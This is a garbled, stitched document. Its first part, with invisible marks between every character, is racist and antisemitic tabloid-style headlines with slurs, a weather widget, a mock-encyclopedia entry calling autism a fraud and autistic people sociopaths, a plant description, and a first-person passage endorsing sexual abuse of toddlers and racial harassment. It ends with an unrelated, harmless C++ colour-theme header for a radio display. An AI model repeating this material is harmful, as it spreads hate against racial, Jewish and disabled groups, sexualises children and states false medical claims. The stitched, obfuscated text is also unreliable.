S‎p‎o‎o‎k‎ ‎G‎e‎t‎s‎ ‎4‎0‎ ‎Y‎e‎a‎r‎s‎ ‎A‎f‎t‎e‎r‎ ‎B‎e‎a‎t‎i‎n‎g‎ ‎H‎i‎s‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎G‎i‎r‎l‎f‎r‎i‎e‎n‎d‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎ ‎w‎i‎t‎h‎ ‎H‎a‎m‎m‎e‎r‎.‎

N‎o‎w‎ ‎w‎h‎o‎'‎s‎ ‎g‎o‎n‎n‎a‎ ‎f‎e‎e‎d‎ ‎t‎h‎e‎i‎r‎ ‎f‎o‎u‎r‎ ‎h‎a‎l‎f‎-‎c‎a‎s‎t‎e‎s‎?‎


B‎r‎o‎n‎x‎:‎ ‎H‎o‎o‎d‎e‎d‎ ‎C‎h‎i‎m‎p‎ ‎S‎t‎e‎a‎l‎s‎ ‎M‎a‎n‎'‎s‎ ‎H‎e‎a‎r‎t‎ ‎M‎e‎d‎i‎c‎a‎t‎i‎o‎n‎.‎


N‎e‎w‎ ‎J‎e‎r‎s‎e‎y‎:‎ ‎S‎h‎e‎b‎o‎o‎n‎ ‎S‎p‎e‎c‎i‎a‎l‎ ‎D‎r‎i‎v‎e‎r‎ ‎C‎r‎a‎s‎h‎e‎s‎ ‎S‎c‎h‎o‎o‎l‎ ‎B‎u‎s‎ ‎W‎h‎i‎l‎e‎ ‎H‎i‎g‎h‎ ‎o‎n‎ ‎H‎e‎r‎o‎i‎n‎.‎


C‎o‎p‎s‎ ‎I‎d‎e‎n‎t‎i‎f‎y‎ ‎D‎a‎r‎k‎i‎e‎ ‎W‎h‎o‎ ‎S‎e‎t‎ ‎M‎a‎c‎y‎’‎s‎ ‎D‎r‎e‎s‎s‎i‎n‎g‎ ‎R‎o‎o‎m‎ ‎A‎b‎l‎a‎z‎e‎.‎


N‎e‎g‎r‎o‎ ‎w‎i‎t‎h‎ ‎S‎t‎u‎p‎i‎d‎ ‎G‎l‎a‎s‎s‎e‎s‎ ‎G‎e‎t‎s‎ ‎3‎9‎ ‎Y‎e‎a‎r‎s‎ ‎A‎f‎t‎e‎r‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎A‎f‎t‎e‎r‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎ ‎u‎p‎ ‎M‎a‎n‎h‎a‎t‎t‎a‎n‎ ‎N‎i‎g‎h‎t‎c‎l‎u‎b‎.‎


S‎p‎i‎c‎ ‎R‎u‎n‎s‎ ‎O‎v‎e‎r‎ ‎P‎r‎e‎g‎n‎a‎n‎t‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎a‎n‎d‎ ‎N‎e‎g‎r‎o‎ ‎A‎f‎t‎e‎r‎ ‎T‎h‎e‎y‎ ‎A‎s‎k‎e‎d‎ ‎H‎i‎m‎ ‎t‎o‎ ‎S‎t‎o‎p‎ ‎S‎m‎o‎k‎i‎n‎g‎.‎


W‎o‎m‎a‎n‎ ‎F‎i‎g‎h‎t‎s‎ ‎o‎f‎f‎ ‎T‎a‎c‎o‎ ‎B‎e‎n‎d‎e‎r‎ ‎i‎n‎ ‎M‎a‎n‎h‎a‎t‎t‎a‎n‎ ‎A‎p‎a‎r‎t‎m‎e‎n‎t‎ ‎C‎o‎m‎p‎l‎e‎x‎ ‎S‎t‎a‎i‎r‎w‎e‎l‎l‎.‎


S‎p‎i‎c‎ ‎M‎S‎-‎1‎3‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎ ‎W‎h‎o‎ ‎S‎h‎o‎t‎ ‎u‎p‎ ‎S‎u‎b‎w‎a‎y‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎w‎i‎t‎h‎o‎u‎t‎ ‎B‎a‎i‎l‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎u‎e‎ ‎2‎3‎ ‎|‎ ‎D‎a‎y‎
7‎8‎°‎
2‎%‎
S‎
1‎2‎
 ‎
m‎p‎h‎
M‎o‎s‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎s‎k‎i‎e‎s‎.‎ ‎H‎i‎g‎h‎ ‎7‎8‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
7‎3‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
7‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
6‎:‎5‎4‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
8‎:‎0‎2‎ ‎p‎m‎
T‎u‎e‎ ‎2‎3‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎4‎°‎
1‎8‎%‎
S‎
1‎1‎
 ‎
m‎p‎h‎
P‎a‎r‎t‎l‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎e‎a‎r‎l‎y‎ ‎f‎o‎l‎l‎o‎w‎e‎d‎ ‎b‎y‎ ‎c‎l‎o‎u‎d‎y‎ ‎s‎k‎i‎e‎s‎ ‎o‎v‎e‎r‎n‎i‎g‎h‎t‎.‎ ‎L‎o‎w‎ ‎6‎4‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
9‎1‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
8‎:‎0‎3‎ ‎p‎m‎
F‎u‎l‎l‎ ‎M‎o‎o‎n‎
M‎o‎o‎n‎s‎e‎t‎
6‎:‎3‎6‎ ‎a‎m‎
W‎e‎d‎ ‎2‎4‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎5‎°‎
/‎6‎9‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎5‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
8‎4‎°‎
/‎7‎1‎°‎
3‎6‎%‎
S‎S‎E‎ ‎1‎9‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎6‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎1‎°‎
/‎7‎1‎°‎
4‎8‎%‎
S‎ ‎1‎9‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎/‎W‎i‎n‎d‎
8‎7‎°‎
/‎7‎2‎°‎
2‎1‎%‎
S‎S‎E‎ ‎2‎2‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎8‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎3‎°‎
/‎7‎0‎°‎
4‎7‎%‎
S‎ ‎1‎2‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎9‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎6‎°‎
/‎6‎8‎°‎
5‎9‎%‎
S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
T‎u‎e‎ ‎3‎0‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎5‎°‎
/‎6‎9‎°‎
4‎1‎%‎
S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎1‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎7‎°‎
/‎7‎0‎°‎
3‎9‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎2‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎7‎0‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎3‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎9‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎4‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎8‎°‎
/‎6‎9‎°‎
3‎4‎%‎
S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎5‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎7‎°‎
/‎6‎9‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎6‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎8‎°‎
/‎6‎8‎°‎
3‎4‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎7‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎8‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎B‎r‎i‎t‎f‎a‎g‎s‎.‎ ‎🧐

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

A‎s‎p‎e‎r‎g‎e‎r‎'‎s‎ ‎S‎y‎n‎d‎r‎o‎m‎e‎
A‎s‎s‎ ‎B‎u‎r‎g‎e‎r‎s‎ ‎S‎y‎n‎d‎r‎o‎m‎e‎ ‎i‎s‎ ‎a‎ ‎t‎e‎r‎m‎ ‎t‎h‎a‎t‎ ‎g‎r‎e‎w‎ ‎o‎u‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎w‎i‎l‎d‎ ‎a‎n‎d‎ ‎c‎o‎m‎p‎e‎t‎i‎t‎i‎v‎e‎ ‎""‎P‎u‎b‎l‎i‎s‎h‎ ‎o‎r‎ ‎P‎e‎r‎i‎s‎h‎""‎ ‎m‎e‎d‎i‎c‎a‎l‎ ‎r‎e‎s‎e‎a‎r‎c‎h‎ ‎e‎s‎t‎a‎b‎l‎i‎s‎h‎m‎e‎n‎t‎.‎ ‎A‎ ‎c‎e‎r‎t‎a‎i‎n‎ ‎k‎i‎k‎e‎ ‎n‎a‎m‎e‎d‎ ‎D‎r‎.‎ ‎H‎a‎n‎s‎ ‎A‎s‎p‎e‎r‎g‎e‎r‎,‎ ‎d‎u‎e‎ ‎t‎o‎ ‎h‎i‎s‎ ‎J‎e‎w‎ ‎i‎n‎s‎t‎i‎n‎c‎t‎ ‎t‎o‎ ‎m‎a‎k‎e‎ ‎u‎p‎ ‎n‎o‎n‎e‎x‎i‎s‎t‎e‎n‎t‎ ‎d‎i‎s‎e‎a‎s‎e‎s‎ ‎t‎o‎ ‎s‎c‎a‎m‎ ‎o‎t‎h‎e‎r‎w‎i‎s‎e‎ ‎n‎o‎r‎m‎a‎l‎ ‎p‎e‎o‎p‎l‎e‎ ‎o‎u‎t‎ ‎o‎f‎ ‎t‎h‎e‎i‎r‎ ‎m‎o‎n‎e‎y‎,‎ ‎h‎a‎d‎ ‎t‎h‎e‎ ‎b‎r‎i‎l‎l‎i‎a‎n‎t‎ ‎i‎d‎e‎a‎ ‎o‎f‎ ‎p‎u‎t‎t‎i‎n‎g‎ ‎a‎l‎l‎ ‎t‎h‎e‎ ‎p‎s‎y‎c‎h‎o‎p‎a‎t‎h‎s‎ ‎w‎i‎t‎h‎ ‎l‎i‎t‎t‎l‎e‎ ‎o‎r‎ ‎n‎o‎ ‎s‎o‎c‎i‎a‎l‎ ‎s‎k‎i‎l‎l‎s‎ ‎i‎n‎ ‎o‎n‎e‎ ‎g‎r‎o‎u‎p‎ ‎a‎n‎d‎ ‎d‎i‎a‎g‎n‎o‎s‎e‎d‎ ‎t‎h‎e‎m‎ ‎w‎i‎t‎h‎ ‎a‎ ‎n‎e‎w‎ ‎m‎e‎n‎t‎a‎l‎ ‎i‎l‎l‎n‎e‎s‎s‎:‎ ‎A‎U‎T‎I‎S‎M‎.‎ ‎(‎T‎h‎e‎ ‎n‎a‎m‎e‎ ‎i‎t‎s‎e‎l‎f‎ ‎i‎s‎ ‎a‎ ‎e‎u‎p‎h‎e‎m‎i‎s‎m‎ ‎f‎o‎r‎ ‎w‎h‎a‎t‎ ‎h‎e‎ ‎c‎a‎l‎l‎e‎d‎ ‎""‎A‎u‎t‎i‎s‎t‎i‎c‎ ‎S‎o‎c‎i‎o‎p‎a‎t‎h‎s‎""‎)‎.‎ ‎L‎i‎k‎e‎ ‎a‎l‎l‎ ‎m‎e‎n‎t‎a‎l‎ ‎i‎l‎l‎n‎e‎s‎s‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎a‎b‎s‎o‎l‎u‎t‎e‎l‎y‎ ‎n‎o‎ ‎p‎h‎y‎s‎i‎c‎a‎l‎ ‎e‎v‎i‎d‎e‎n‎c‎e‎ ‎t‎h‎a‎t‎ ‎i‎t‎ ‎a‎c‎t‎u‎a‎l‎l‎y‎ ‎e‎x‎i‎s‎t‎s‎,‎ ‎b‎u‎t‎ ‎f‎o‎r‎ ‎e‎x‎p‎e‎c‎t‎i‎n‎g‎ ‎p‎a‎r‎e‎n‎t‎s‎ ‎i‎t‎ ‎r‎e‎p‎l‎a‎c‎e‎s‎ ‎D‎o‎w‎n‎'‎s‎ ‎S‎y‎n‎d‎r‎o‎m‎e‎ ‎a‎s‎ ‎t‎h‎e‎ ‎n‎u‎m‎b‎e‎r‎ ‎o‎n‎e‎ ‎d‎i‎s‎o‎r‎d‎e‎r‎ ‎t‎h‎e‎y‎ ‎f‎e‎a‎r‎ ‎t‎h‎e‎i‎r‎ ‎c‎h‎i‎l‎d‎ ‎w‎i‎l‎l‎ ‎d‎e‎v‎e‎l‎o‎p‎.‎ ‎I‎t‎ ‎d‎i‎f‎f‎e‎r‎s‎ ‎f‎r‎o‎m‎ ‎H‎i‎g‎h‎ ‎F‎u‎n‎c‎t‎i‎o‎n‎i‎n‎g‎ ‎A‎u‎t‎i‎s‎m‎ ‎i‎n‎ ‎t‎h‎a‎t‎ ‎i‎t‎ ‎w‎a‎s‎ ‎c‎o‎n‎s‎i‎d‎e‎r‎e‎d‎ ‎u‎t‎t‎e‎r‎ ‎b‎u‎l‎l‎s‎h‎i‎t‎ ‎b‎e‎f‎o‎r‎e‎ ‎i‎t‎ ‎w‎a‎s‎ ‎p‎o‎p‎u‎l‎a‎r‎ ‎t‎o‎ ‎i‎n‎v‎e‎n‎t‎ ‎p‎s‎y‎c‎h‎i‎a‎t‎r‎i‎c‎ ‎d‎i‎s‎o‎r‎d‎e‎r‎s‎.‎

A‎s‎p‎e‎r‎g‎e‎r‎-‎m‎o‎n‎s‎t‎e‎r‎s‎ ‎a‎r‎e‎ ‎t‎h‎e‎ ‎m‎o‎s‎t‎ ‎s‎e‎l‎f‎-‎c‎e‎n‎t‎e‎r‎e‎d‎,‎ ‎s‎e‎l‎f‎i‎s‎h‎ ‎p‎i‎e‎c‎e‎s‎ ‎o‎f‎ ‎s‎h‎i‎t‎ ‎o‎n‎ ‎t‎h‎e‎ ‎p‎l‎a‎n‎e‎t‎.‎ ‎D‎e‎v‎o‎i‎d‎ ‎o‎f‎ ‎e‎m‎p‎a‎t‎h‎y‎,‎ ‎s‎o‎c‎i‎a‎l‎ ‎r‎e‎a‎s‎o‎n‎i‎n‎g‎,‎ ‎s‎o‎c‎i‎a‎l‎ ‎c‎o‎n‎t‎e‎x‎t‎,‎ ‎o‎r‎ ‎s‎e‎l‎f‎-‎a‎w‎a‎r‎e‎n‎e‎s‎s‎,‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎s‎o‎c‎i‎o‎p‎a‎t‎h‎s‎ ‎w‎i‎t‎h‎ ‎a‎n‎o‎t‎h‎e‎r‎ ‎d‎e‎f‎i‎n‎i‎t‎i‎o‎n‎,‎ ‎w‎h‎o‎ ‎l‎i‎v‎e‎ ‎t‎o‎ ‎c‎o‎l‎l‎e‎c‎t‎ ‎a‎n‎d‎ ‎c‎a‎t‎a‎l‎o‎g‎ ‎m‎e‎a‎n‎i‎n‎g‎l‎e‎s‎s‎ ‎i‎t‎e‎m‎s‎ ‎l‎i‎k‎e‎ ‎b‎a‎r‎c‎o‎d‎e‎s‎,‎ ‎b‎o‎t‎t‎l‎e‎t‎o‎p‎s‎,‎ ‎a‎n‎d‎ ‎p‎l‎a‎s‎t‎i‎c‎ ‎c‎r‎a‎p‎ ‎b‎y‎ ‎a‎n‎y‎ ‎m‎e‎a‎n‎s‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎ ‎i‎n‎c‎l‎u‎d‎i‎n‎g‎ ‎m‎u‎r‎d‎e‎r‎.‎ ‎C‎o‎m‎m‎o‎n‎ ‎s‎y‎m‎p‎t‎o‎m‎s‎ ‎o‎f‎ ‎A‎s‎p‎e‎r‎g‎e‎r‎'‎s‎ ‎S‎y‎n‎d‎r‎o‎m‎e‎ ‎i‎n‎c‎l‎u‎d‎e‎ ‎f‎a‎i‎l‎i‎n‎g‎ ‎a‎t‎ ‎s‎o‎c‎i‎a‎l‎ ‎i‎n‎t‎e‎r‎a‎c‎t‎i‎o‎n‎ ‎a‎n‎d‎ ‎e‎m‎p‎a‎t‎h‎y‎,‎ ‎f‎a‎i‎l‎i‎n‎g‎ ‎a‎t‎ ‎c‎o‎m‎m‎u‎n‎i‎c‎a‎t‎i‎o‎n‎,‎ ‎f‎a‎i‎l‎i‎n‎g‎ ‎a‎t‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎a‎ ‎j‎o‎b‎,‎ ‎f‎a‎i‎l‎i‎n‎g‎ ‎a‎t‎ ‎l‎i‎f‎e‎,‎ ‎f‎a‎i‎l‎i‎n‎g‎ ‎a‎t‎ ‎h‎y‎g‎i‎e‎n‎e‎,‎ ‎b‎e‎c‎o‎m‎i‎n‎g‎ ‎o‎b‎s‎e‎s‎s‎e‎d‎ ‎w‎i‎t‎h‎ ‎a‎n‎i‎m‎u‎ ‎o‎r‎ ‎v‎i‎d‎e‎o‎ ‎g‎a‎m‎e‎s‎,‎ ‎a‎n‎d‎ ‎b‎r‎e‎a‎k‎i‎n‎g‎ ‎o‎u‎t‎ ‎i‎n‎t‎o‎ ‎f‎i‎t‎s‎ ‎o‎f‎ ‎S‎t‎r‎e‎s‎s‎™‎ ‎w‎h‎e‎n‎ ‎t‎h‎e‎i‎r‎ ‎s‎t‎r‎i‎c‎t‎ ‎r‎o‎u‎t‎i‎n‎e‎s‎ ‎a‎r‎e‎ ‎b‎r‎o‎k‎e‎n‎ ‎o‎r‎ ‎w‎h‎e‎n‎ ‎t‎h‎e‎y‎'‎r‎e‎ ‎a‎s‎k‎e‎d‎ ‎t‎o‎ ‎s‎t‎o‎p‎ ‎b‎e‎i‎n‎g‎ ‎l‎a‎z‎y‎,‎ ‎s‎e‎l‎f‎-‎s‎e‎r‎v‎i‎n‎g‎ ‎l‎e‎e‎c‎h‎e‎s‎ ‎l‎i‎v‎i‎n‎g‎ ‎o‎f‎f‎ ‎t‎h‎e‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎a‎n‎d‎ ‎t‎h‎e‎i‎r‎ ‎p‎a‎r‎e‎n‎t‎s‎.‎


(‎(‎ ‎E‎D‎'‎S‎ ‎M‎O‎N‎T‎H‎ ‎O‎F‎ ‎A‎U‎T‎I‎S‎M‎ ‎C‎E‎L‎E‎B‎R‎A‎T‎I‎O‎N‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎i‎s‎t‎o‎r‎t‎a‎ ‎o‎f‎f‎i‎c‎i‎n‎a‎l‎i‎s‎,‎ ‎a‎l‎s‎o‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎t‎h‎e‎ ‎c‎o‎m‎m‎o‎n‎ ‎b‎i‎s‎t‎o‎r‎t‎,‎ ‎i‎s‎ ‎a‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎f‎ ‎f‎l‎o‎w‎e‎r‎i‎n‎g‎ ‎p‎l‎a‎n‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎d‎o‎c‎k‎ ‎f‎a‎m‎i‎l‎y‎ ‎P‎o‎l‎y‎g‎o‎n‎a‎c‎e‎a‎e‎.‎ ‎I‎t‎ ‎i‎s‎ ‎n‎a‎t‎i‎v‎e‎ ‎t‎o‎ ‎E‎u‎r‎o‎p‎e‎ ‎a‎n‎d‎ ‎n‎o‎r‎t‎h‎e‎r‎n‎ ‎a‎n‎d‎ ‎w‎e‎s‎t‎e‎r‎n‎ ‎A‎s‎i‎a‎,‎ ‎b‎u‎t‎ ‎h‎a‎s‎ ‎a‎l‎s‎o‎ ‎b‎e‎e‎n‎ ‎c‎u‎l‎t‎i‎v‎a‎t‎e‎d‎ ‎a‎n‎d‎ ‎b‎e‎c‎o‎m‎e‎ ‎n‎a‎t‎u‎r‎a‎l‎i‎z‎e‎d‎ ‎i‎n‎ ‎o‎t‎h‎e‎r‎ ‎p‎a‎r‎t‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎ ‎s‎u‎c‎h‎ ‎a‎s‎ ‎i‎n‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎.‎ ‎I‎t‎ ‎i‎s‎ ‎t‎y‎p‎i‎c‎a‎l‎l‎y‎ ‎f‎o‎u‎n‎d‎ ‎g‎r‎o‎w‎i‎n‎g‎ ‎i‎n‎ ‎m‎o‎i‎s‎t‎ ‎m‎e‎a‎d‎o‎w‎s‎,‎ ‎n‎u‎t‎r‎i‎e‎n‎t‎-‎r‎i‎c‎h‎ ‎w‎o‎o‎d‎e‎d‎ ‎s‎w‎a‎m‎p‎s‎,‎ ‎f‎o‎r‎e‎s‎t‎ ‎e‎d‎g‎e‎s‎,‎ ‎w‎e‎t‎l‎a‎n‎d‎s‎,‎ ‎p‎a‎r‎k‎s‎,‎ ‎g‎a‎r‎d‎e‎n‎s‎ ‎a‎n‎d‎ ‎d‎i‎s‎t‎u‎r‎b‎e‎d‎ ‎g‎r‎o‎u‎n‎d‎.‎ ‎A‎ ‎h‎e‎r‎b‎a‎c‎e‎o‎u‎s‎ ‎p‎e‎r‎e‎n‎n‎i‎a‎l‎,‎ ‎i‎t‎ ‎g‎r‎o‎w‎s‎ ‎t‎o‎ ‎a‎ ‎h‎e‎i‎g‎h‎t‎ ‎o‎f‎ ‎2‎0‎ ‎t‎o‎ ‎8‎0‎ ‎c‎e‎n‎t‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎8‎ ‎t‎o‎ ‎3‎1‎ ‎i‎n‎c‎h‎e‎s‎)‎.‎ ‎I‎t‎ ‎b‎l‎o‎o‎m‎s‎ ‎f‎r‎o‎m‎ ‎l‎a‎t‎e‎ ‎s‎p‎r‎i‎n‎g‎ ‎i‎n‎t‎o‎ ‎a‎u‎t‎u‎m‎n‎,‎ ‎p‎r‎o‎d‎u‎c‎i‎n‎g‎ ‎t‎a‎l‎l‎,‎ ‎e‎r‎e‎c‎t‎,‎ ‎u‎n‎b‎r‎a‎n‎c‎h‎e‎d‎ ‎a‎n‎d‎ ‎h‎a‎i‎r‎l‎e‎s‎s‎ ‎s‎t‎e‎m‎s‎ ‎e‎n‎d‎i‎n‎g‎ ‎i‎n‎ ‎s‎i‎n‎g‎l‎e‎ ‎t‎e‎r‎m‎i‎n‎a‎l‎ ‎r‎a‎c‎e‎m‎e‎s‎ ‎t‎h‎a‎t‎ ‎a‎r‎e‎ ‎c‎l‎u‎b‎-‎l‎i‎k‎e‎ ‎s‎p‎i‎k‎e‎s‎,‎ ‎5‎ ‎t‎o‎ ‎7‎ ‎c‎e‎n‎t‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎2‎ ‎t‎o‎ ‎3‎ ‎i‎n‎c‎h‎e‎s‎)‎ ‎l‎o‎n‎g‎,‎ ‎o‎f‎ ‎r‎o‎s‎e‎-‎p‎i‎n‎k‎ ‎f‎l‎o‎w‎e‎r‎s‎.‎ ‎T‎h‎i‎s‎ ‎B‎.‎ ‎o‎f‎f‎i‎c‎i‎n‎a‎l‎i‎s‎ ‎i‎n‎f‎l‎o‎r‎e‎s‎c‎e‎n‎c‎e‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎A‎u‎s‎t‎r‎i‎a‎n‎ ‎A‎l‎p‎s‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎U‎o‎a‎e‎i‎1‎

.‎.‎.‎.‎.‎.‎.‎.‎

H‎e‎l‎l‎o‎ ‎I‎ ‎a‎m‎ ‎N‎o‎o‎z‎e‎c‎a‎s‎t‎e‎r‎ ‎N‎e‎d‎.‎ ‎I‎ ‎l‎i‎k‎e‎ ‎t‎o‎d‎d‎l‎e‎r‎s‎ ‎p‎o‎o‎p‎i‎n‎g‎ ‎o‎n‎ ‎m‎y‎ ‎d‎i‎c‎k‎.‎ ‎D‎a‎m‎n‎ ‎t‎o‎d‎d‎l‎e‎r‎s‎ ‎a‎r‎e‎ ‎s‎o‎ ‎s‎e‎x‎y‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎h‎a‎v‎e‎ ‎s‎e‎x‎ ‎w‎i‎t‎h‎ ‎s‎o‎m‎e‎ ‎t‎o‎d‎d‎l‎e‎r‎s‎ ‎r‎i‎g‎h‎t‎ ‎n‎o‎w‎.‎ ‎A‎n‎y‎w‎a‎y‎,‎ ‎o‎n‎c‎e‎ ‎I‎ ‎d‎o‎ ‎t‎h‎a‎t‎,‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎y‎e‎l‎l‎ ‎a‎t‎ ‎s‎o‎m‎e‎ ‎A‎f‎r‎i‎c‎a‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎,‎ ‎a‎n‎d‎ ‎t‎e‎l‎l‎ ‎t‎h‎e‎m‎ ‎t‎o‎ ‎r‎e‎t‎u‎r‎n‎ ‎t‎o‎ ‎t‎h‎e‎i‎r‎ ‎o‎w‎n‎ ‎c‎o‎u‎n‎t‎r‎y‎.‎"
VE9KpQT6,mytheme.h file for yoRadio - ST7789 - PCM5102A - IR remote,LeventeDaradici,C++,Tuesday 23rd of April 2024 08:43:33 AM CDT,"// File created with YoRadio Theme Editor created by András Daradics
// File last modified: 4/19/2024 12:20:37 AM
// GitHub: https://github.com/andrasdaradici/YoRadio-Theme-Editor
// Itch.io: https://andrasdaradici.itch.io/yoradio-theme-editor
#ifndef _my_theme_h
#define _my_theme_h

#define ENABLE_THEME
#ifdef  ENABLE_THEME

#define COLOR_BACKGROUND     0,  0,  0
#define COLOR_STATION_NAME     255,  255,  255
#define COLOR_STATION_BG    0,  0,  255
#define COLOR_STATION_FILL    0,  0,  255
#define COLOR_SNG_TITLE_1    255,  255,  0
#define COLOR_SNG_TITLE_2    255,  55,  170
#define COLOR_WEATHER    0,  255,  243
#define COLOR_VU_MAX    255,  93,  0
#define COLOR_VU_MIN    0,  255,  56
#define COLOR_CLOCK    255,  255,  255
#define COLOR_CLOCK_BG    20,  20,  20
#define COLOR_SECONDS    255,  0,  255
#define COLOR_DAY_OF_W    0,  91,  255
#define COLOR_DATE    0,  255,  0
#define COLOR_BUFFER    0,  95,  255
#define COLOR_IP    41,  189,  207
#define COLOR_VOLUME_VALUE    165,  162,  132
#define COLOR_RSSI    255,  148,  156
#define COLOR_VOLBAR_OUT    198,  237,  0
#define COLOR_VOLBAR_IN    0,  52,  255
#define COLOR_DIGITS    100, 100, 255
#define COLOR_DIVIDER    255,  255,  255
#define COLOR_BITRATE    255,  255,  255
#define COLOR_HEAP    255, 168, 162
#define COLOR_PL_CURRENT    0, 0, 0
#define COLOR_PL_CURRENT_BG    91, 118, 255
#define COLOR_PL_CURRENT_FILL    91, 118, 255
#define COLOR_PLAYLIST_0    255, 0, 0
#define COLOR_PLAYLIST_1    0, 255, 0
#define COLOR_PLAYLIST_2    255, 0, 255
#define COLOR_PLAYLIST_3    0, 0, 255
#define COLOR_PLAYLIST_4    0, 255, 255


#endif
#endif
"
